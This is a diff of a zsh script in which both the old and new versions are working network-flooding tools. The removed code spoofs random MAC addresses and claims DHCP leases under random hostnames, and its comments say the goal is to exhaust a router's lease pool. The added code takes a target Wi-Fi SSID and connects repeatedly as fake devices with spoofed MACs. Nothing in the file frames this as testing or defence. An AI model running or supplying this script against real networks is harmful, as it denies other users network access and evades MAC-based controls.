@@ -1,39 +1,56 @@
 #!/bin/zsh
+# yo fuck you if you use bash or fish.
 
-# Check if an argument was passed
-if [[ -z "$1" ]]; then
-    echo "Usage: $0 <number_of_iterations>"
-    exit 1
+# Define the usage menu
+usage() { 
+    echo -e "Usage: sudo $0 -s <SSID> [-c <count>] [-d <delay>]\n   -s : Wi-Fi ESSID\n   -c : Count of fake devices\n   -d : seconds of sleep between each connection. unfortunately, this is necessary\n\n"
+    exit 1 
+}
+
+# Default values if flags are omitted
+c=10
+d=10
+
+# Parse the flags
+while getopts "s:c:d:h" opt; do
+    case ${opt} in
+        s ) s=$OPTARG ;;
+        c ) c=$OPTARG ;;
+        d ) d=$OPTARG ;;
+        h ) usage ;;
+        \? ) usage ;;
+    esac
+done
+
+# Check if the target SSID was provided (Notice the exact spacing here)
+if [ -z "$s" ]; then
+    echo -e "Use -s for an ESSID -- Required\n"
+    usage
 fi
 
-cpl=0
-for ((i=1; i<=$1; i++)); do
-        ((cpl++))
-        # Silence the interface text so your custom loop messages pop out
-        sudo ip link set dev wlan0 down >/dev/null 2>&1 && \
-        sudo macchanger -r wlan0 >/dev/null 2>&1 && \
-        sudo ip link set dev wlan0 up >/dev/null 2>&1
+# Main simulation loop
+for ((shit=1; shit<=$c; shit++)); do
+    echo "Simulating device #$shit of $c..."
     
-        # A tiny pause lets the physical Wi-Fi hardware catch its breath after coming up
-        sleep 0.5
-
-        # Cleaner random generation that won't throw SIGPIPE errors
-        HOSTNAME=$(LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom | dd bs=1 count=12 2>/dev/null)
+    sudo ip link set wlan0 down
+    sudo macchanger -r wlan0
+    sudo ip link set wlan0 up
     
-        # sudo dhclient -r wlan0 
-        # fuck the router. This script would be kinda fucking useless if we just 
-        # said "yo bro, im not using this anymore" when we're trying to exhaust the lease pool
+    # Connect with a fixed timeout so it doesn't hang forever on failures
+    sudo nmcli --timeout 8 device wifi connect "$s"
     
-        if sudo dhclient -H "$HOSTNAME" wlan0 >/dev/null 2>&1; then
-            echo "--> loop $cpl: Successfully claimed a new IP lease <---"
-        else
-            echo "--> loop $cpl: DHCP request failed <---"
-        fi
-        #sleep 60
-        # sleep is for the weak (people and wlan cards alike)
+    # Wait for the router to log the connection and issue an IP
+    echo "Sleeping for $d seconds..."
+    sleep "$d"
 done
-    
-    # Keep in mind that this changes the interface identity and
-    # repeatedly requests DHCP leases.
-    # this might piss off the DHCP server lol
-    
+
+echo "Fleet simulation complete!"
+cleanup() {
+    echo -e "\n\n[!] Resetting interface to factory default. "
+    sudo ip link set wlan0 down
+    sudo macchanger -p wlan0        # <- Native reset flag
+    sudo ip link set wlan0 up
+    exit 0
+}
+# Trap Ctrl+C (SIGINT) and terminal termination (SIGTERM)
+trap cleanup SIGINT SIGTERM
